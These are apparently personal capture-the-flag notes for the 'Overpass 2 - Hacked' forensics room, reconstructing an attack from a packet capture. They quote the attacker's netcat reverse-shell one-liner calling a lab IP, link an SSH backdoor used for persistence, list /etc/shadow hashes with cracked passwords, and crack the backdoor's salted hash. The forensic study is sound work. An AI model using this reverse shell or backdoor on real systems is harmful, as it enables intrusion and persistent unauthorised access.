## Overpass 2 - Hacked

import it in wireshark

![[Pasted image 20210529001434.png]]

Shell uploaded via /development/

![[Pasted image 20210529001620.png]]

follow the tcp dump 

![[Pasted image 20210529002202.png]]

payload `exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")`

passwd : whenevernoteartinstant

![[Pasted image 20210529002503.png]]

backdoor persistence: https://github.com/NinjaJc01/ssh-backdoor

![[Pasted image 20210529002638.png]]

/etc/shadow
![[Pasted image 20210529003040.png]]


```
james:$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/

paradox:$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0

szymex:$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/

bee:$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0

muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.
```


![[Pasted image 20210529004214.png]]
![[Pasted image 20210529004334.png]]
![[Pasted image 20210529004431.png]]
![[Pasted image 20210529004459.png]]


```
paradox:secuirty3
szymex:abcd123
bee:secret12
muirland:1qaz2wsx
```

the hash and salt from https://github.com/NinjaJc01/ssh-backdoor/blob/master/main.go

the hacker's hash
![[Pasted image 20210529005134.png]]

`6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed`

```
6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05
```
cracking the hash (hashcat mode 1710) : november16

![[Pasted image 20210529010115.png]]


